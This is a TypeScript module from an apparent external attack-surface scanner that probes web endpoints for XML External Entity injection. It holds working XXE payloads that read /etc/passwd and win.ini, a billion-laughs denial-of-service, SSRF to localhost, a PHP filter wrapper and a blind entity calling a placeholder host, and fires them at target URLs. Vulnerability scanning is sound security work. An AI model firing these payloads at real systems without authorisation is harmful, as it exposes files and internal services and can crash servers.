/**
 * XXE (XML External Entity) Injection Module
 *
 * Tests for XXE vulnerabilities by sending XML payloads with external
 * entity definitions to endpoints that accept XML input.
 */
import type { XxeResult } from "./types";

async function fetchWith(
  url: string,
  method: string,
  body: string,
  contentType: string,
  timeoutMs = 8000
): Promise<{ status: number; body: string; headers: Record<string, string> } | null> {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), timeoutMs);
  try {
    const res = await fetch(url, {
      method,
      signal: ctrl.signal,
      redirect: "manual",
      body: method === "GET" ? undefined : body,
      headers: { "User-Agent": "easm-scanner/1.0", "Content-Type": contentType },
    });
    let b = "";
    try { b = await res.text(); } catch { /* ignore */ }
    const h: Record<string, string> = {};
    res.headers.forEach((v, k) => (h[k.toLowerCase()] = v));
    return { status: res.status, body: b.slice(0, 50000), headers: h };
  } catch { return null; } finally { clearTimeout(t); }
}

// XXE payloads — test for entity expansion, file reading, SSRF, and OOB
const XXE_PAYLOADS: { technique: string; payload: string; evidence: RegExp }[] = [
  {
    technique: "Classic file read (/etc/passwd)",
    payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
    evidence: /root:x:|daemon:|bin:|sys:|nobody:|\/bin\/(ba)?sh/i,
  },
  {
    technique: "Classic file read (Windows win.ini)",
    payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><foo>&xxe;</foo>`,
    evidence: /\[fonts\]|\[extensions\]|for 16-bit|MAPI=/i,
  },
  {
    technique: "Billion laughs (DoS)",
    payload: `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>`,
    evidence: /timeout|500 internal server error|memory/i,
  },
  {
    technique: "Parameter entity (blind)",
    payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://easm-xxe-test.invalid/x.dtd"> %xxe; ]><foo>test</foo>`,
    evidence: /dns resolution error|connection refused|easm-xxe-test/i,
  },
  {
    technique: "SSRF via XXE (internal port scan)",
    payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><foo>&xxe;</foo>`,
    evidence: /<html|connection refused|404|403|200/i,
  },
  {
    technique: "PHP wrapper (base64 encode)",
    payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>`,
    evidence: /[A-Za-z0-9+/=]{20,}/,
  },
  {
    technique: "UTF-16 encoding bypass",
    payload: `<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
    evidence: /root:x:|daemon:|bin:/i,
  },
];

const XML_PARAMS = ["xml", "data", "body", "payload", "content", "doc", "document", "request", "soap", "message", "input", "json", "feed"];

export async function runXxe(
  urls: string[],
  log: (msg: string) => void
): Promise<XxeResult> {
  const hosts: XxeResult["hosts"] = [];
  log(`Testing XXE injection on ${urls.length} host(s) ...`);

  for (const url of urls.slice(0, 5)) {
    log(`  probing ${url} for XML endpoints ...`);
    const endpoints: XxeResult["hosts"][0]["endpoints"] = [];
    const findings: XxeResult["hosts"][0]["findings"] = [];

    // Get baseline
    const baseline = await fetchWith(url, "GET", "", "text/xml");
    if (!baseline) { log(`    [-] no response`); continue; }

    // Check if the endpoint accepts XML at all (send a simple XML doc)
    const xmlTest = await fetchWith(url, "POST", `<?xml version="1.0"?><foo>test</foo>`, "application/xml");
    const acceptsXml = xmlTest && xmlTest.status !== 415 && xmlTest.status !== 400;

    // Test each XXE payload via POST with XML content-type
    for (const spec of XXE_PAYLOADS) {
      const res = await fetchWith(url, "POST", spec.payload, "application/xml");
      if (!res) continue;
      const suspicious = spec.evidence.test(res.body);
      if (suspicious) {
        // Verify the evidence isn't in the baseline (avoid false positives)
        const inBaseline = spec.evidence.test(baseline.body);
        if (!inBaseline) {
          endpoints.push({
            param: "(XML body)",
            method: "POST",
            payload: spec.payload.slice(0, 80),
            technique: spec.technique,
            suspicious: true,
            evidence: res.body.match(spec.evidence)?.[0]?.slice(0, 80) || "",
          });
          findings.push({
            id: `xxe-${spec.technique.slice(0, 20)}`,
            severity: spec.technique.includes("DoS") ? "medium" : "high",
            title: `XXE: ${spec.technique}`,
            detail: `${url} accepted XML with external entities. The response contains evidence of ${spec.technique}. This allows reading files, SSRF, or DoS.`,
          });
          log(`    [!] XXE confirmed: ${spec.technique}`);
        }
      }
    }

    // Also test XML in common query params
    for (const param of XML_PARAMS.slice(0, 6)) {
      const testUrl = `${url}${url.includes("?") ? "&" : "?"}${param}=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`;
      const res = await fetchWith(testUrl, "GET", "", "text/xml");
      if (res && /root:x:|daemon:|bin:/i.test(res.body) && !/root:x:|daemon:|bin:/i.test(baseline.body)) {
        endpoints.push({
          param,
          method: "GET",
          payload: "ENTITY xxe SYSTEM file:///etc/passwd",
          technique: "Param XXE (file read)",
          suspicious: true,
          evidence: "root:x: in response",
        });
        findings.push({
          id: `xxe-param-${param}`,
          severity: "high",
          title: `XXE via parameter '${param}'`,
          detail: `${url} reflects XML entities in the '${param}' parameter and reads local files.`,
        });
        log(`    [!] XXE via param '${param}': file read confirmed`);
      }
    }

    if (!endpoints.length && acceptsXml) {
      log(`    [-] accepts XML but no XXE confirmed`);
    } else if (!endpoints.length) {
      log(`    [-] no XML endpoints`);
    }

    hosts.push({ url, endpoints, findings });
    const sevCount: Record<string, number> = {};
    for (const f of findings) sevCount[f.severity] = (sevCount[f.severity] || 0) + 1;
    const summary = ["high", "medium", "low"].filter((s) => sevCount[s]).map((s) => `${sevCount[s]} ${s}`).join(", ");
    log(`  [+] ${url}: ${endpoints.length} XXE point(s)${summary ? " (" + summary + ")" : ""}`);
  }

  const total = hosts.reduce((a, h) => a + h.endpoints.length, 0);
  log(`XXE testing complete: ${total} suspicious point(s) across ${hosts.length} host(s).`);
  return { hosts };
}
